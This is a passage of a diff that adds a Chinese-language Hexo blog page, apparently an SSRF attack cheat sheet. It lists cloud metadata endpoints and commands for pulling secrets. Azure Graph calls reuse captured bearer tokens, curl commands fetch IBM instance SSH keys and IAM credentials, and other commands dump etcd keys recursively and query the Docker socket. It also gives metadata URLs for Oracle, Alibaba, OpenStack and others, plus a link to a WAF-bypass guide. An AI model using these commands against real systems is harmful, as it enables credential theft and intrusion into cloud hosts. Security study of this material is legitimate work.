class="string">&quot;Bearer <span class="variable">$Token</span>&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">(Invoke-RestMethod @RequestParams).value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向graph端点发送API请求 (获取企业应用程序)</span></span><br><span class="line"><span class="variable">$Token</span> = <span class="string">&#x27;eyJ0eX..&#x27;</span></span><br><span class="line"><span class="variable">$URI</span> = <span class="string">&#x27;https://graph.microsoft.com/v1.0/applications&#x27;</span></span><br><span class="line"><span class="variable">$RequestParams</span> = @&#123;</span><br><span class="line"> Method = <span class="string">&#x27;GET&#x27;</span></span><br><span class="line"> Uri = <span class="variable">$URI</span></span><br><span class="line"> Headers = @&#123;</span><br><span class="line"> <span class="string">&#x27;Authorization&#x27;</span> = <span class="string">&quot;Bearer <span class="variable">$Token</span>&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">(Invoke-RestMethod @RequestParams).value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用不带管理令牌和graph令牌的AzureAD PowerShell模块</span></span><br><span class="line"><span class="variable">$token</span> = <span class="string">&#x27;eyJ0e..&#x27;</span></span><br><span class="line"><span class="variable">$graphaccesstoken</span> = <span class="string">&#x27;eyJ0eX..&#x27;</span></span><br><span class="line">Connect-AzAccount -AccessToken <span class="variable">$token</span> -GraphAccessToken <span class="variable">$graphaccesstoken</span> -AccountId 2e91a4f12984-46ee-2736-e32ff2039abc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试获取资源的当前权限</span></span><br><span class="line">Get-AzResource</span><br><span class="line"><span class="comment">## 以下错误表示用户没有任何资源的权限</span></span><br><span class="line">Get-AzResource : <span class="string">&#x27;this.Client.SubscriptionId&#x27;</span> cannot be null.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ Get-AzResource</span><br><span class="line">+ ~~~~~~~~~~~~~~</span><br><span class="line"> + CategoryInfo : CloseError: (:) [Get-AzResource],ValidationException</span><br><span class="line"> + FullyQualifiedErrorId :</span><br><span class="line">Microsoft.Azure.Commands.ResourceManager.Cmdlets.Implementation.GetAzureResourceCmdlet</span><br></pre></td></tr></table></figure>
+
+<h3 id="IBM"><a href="#IBM" class="headerlink" title="IBM"></a>IBM</h3><p>在IBM中，默认情况下元数据未启用，因此即使位于IBM云VM内，也可能无法访问它</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> instance_identity_token=`curl -s -X PUT <span class="string">&quot;http://169.254.169.254/instance_identity/v1/token?version=2022-03-01&quot;</span>\</span><br><span class="line">  -H <span class="string">&quot;Metadata-Flavor: ibm&quot;</span>\</span><br><span class="line">  -H <span class="string">&quot;Accept: application/json&quot;</span>\</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">        &quot;expires_in&quot;: 3600</span></span><br><span class="line"><span class="string">      &#125;&#x27;</span> | jq -r <span class="string">&#x27;(.access_token)&#x27;</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取实例详细信息</span></span><br><span class="line">curl -s -H <span class="string">&quot;Accept: application/json&quot;</span> -H <span class="string">&quot;Authorization: Bearer <span class="variable">$instance_identity_token</span>&quot;</span> -X GET <span class="string">&quot;http://169.254.169.254/metadata/v1/instance?version=2022-03-01&quot;</span> | jq</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取SSH密钥信息</span></span><br><span class="line">curl -s -X GET -H <span class="string">&quot;Accept: application/json&quot;</span> -H <span class="string">&quot;Authorization: Bearer <span class="variable">$instance_identity_token</span>&quot;</span> <span class="string">&quot;http://169.254.169.254/metadata/v1/keys?version=2022-03-01&quot;</span> | jq</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取SSH密钥指纹和用户数据</span></span><br><span class="line">curl -s -X GET -H <span class="string">&quot;Accept: application/json&quot;</span> -H <span class="string">&quot;Authorization: Bearer <span class="variable">$instance_identity_token</span>&quot;</span> <span class="string">&quot;http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01&quot;</span> | jq</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取归置组</span></span><br><span class="line">curl -s -X GET -H <span class="string">&quot;Accept: application/json&quot;</span> -H <span class="string">&quot;Authorization: Bearer <span class="variable">$instance_identity_token</span>&quot;</span> <span class="string">&quot;http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01&quot;</span> | jq</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取IAM凭证</span></span><br><span class="line">curl -s -X POST -H <span class="string">&quot;Accept: application/json&quot;</span> -H <span class="string">&quot;Authorization: Bearer <span class="variable">$instance_identity_token</span>&quot;</span> <span class="string">&quot;http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01&quot;</span> | jq</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="OpenStack-RackSpace"><a href="#OpenStack-RackSpace" class="headerlink" title="OpenStack&#x2F;RackSpace"></a>OpenStack&#x2F;RackSpace</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/openstack</span><br></pre></td></tr></table></figure>
+
+<h3 id="HP-Helion"><a href="#HP-Helion" class="headerlink" title="HP Helion"></a>HP Helion</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/2009-04-04/meta-data/</span><br></pre></td></tr></table></figure>
+
+<h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.0.0.192/latest/</span><br><span class="line">http://192.0.0.192/latest/user-data/</span><br><span class="line">http://192.0.0.192/latest/meta-data/</span><br><span class="line">http://192.0.0.192/latest/attributes/</span><br></pre></td></tr></table></figure>
+
+<h3 id="Alibaba"><a href="#Alibaba" class="headerlink" title="Alibaba"></a>Alibaba</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://100.100.100.200/latest/meta-data/</span><br><span class="line">http://100.100.100.200/latest/meta-data/instance-id</span><br><span class="line">http://100.100.100.200/latest/meta-data/image-id</span><br></pre></td></tr></table></figure>
+
+<h3 id="Kubernetes-ETCD"><a href="#Kubernetes-ETCD" class="headerlink" title="Kubernetes ETCD"></a>Kubernetes ETCD</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L http://127.0.0.1:2379/version</span><br><span class="line">curl http://127.0.0.1:2379/v2/keys/?recursive=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2375/v1.24/containers/json</span><br><span class="line"></span><br><span class="line">简单例子</span><br><span class="line">docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash</span><br><span class="line">bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json</span><br><span class="line">bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json</span><br></pre></td></tr></table></figure>
+
+<h3 id="Rancher"><a href="#Rancher" class="headerlink" title="Rancher"></a>Rancher</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://rancher-metadata/&lt;version&gt;/&lt;path&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p><a target="_blank" rel="noopener" href="https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SSRF/waf.md">SSRF Bypass</a></p>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2024/11/05/XXE/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">XXE</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="/favicon.ico" class="soft-size--round soft-style--box" alt="略略略">
+    
+    
+      <h2>略略略</h2>
+    
+    
+      <p>贵在坚持</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>17</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        5
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>暂无</p>
+  </div>
+</section>
+
+
+      <section class="widget-categories widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+      <span>CATEGORIES</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categories-list">
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/Windows/" style="font-size: 10px;" class="tags-cloud-0">Windows</a> <a href="/tags/c%E4%BB%A3%E7%A0%81/" style="font-size: 20px;" class="tags-cloud-10">c代码</a> <a href="/tags/c%E5%9F%BA%E7%A1%80/" style="font-size: 15px;" class="tags-cloud-5">c基础</a> <a href="/tags/web%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;" class="tags-cloud-5">web漏洞</a> <a href="/tags/%E9%80%86%E5%90%91/" style="font-size: 15px;" class="tags-cloud-5">逆向</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+          <a href="https://twitter.com" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
+</svg>
+          </a>
+        
+      
+    </div>
+     
+    <p>&copy; 2024 <a href="/" target="_blank">John Doe</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+<!-- copy button  -->
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+<!-- https://clipboardjs.com/ -->
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
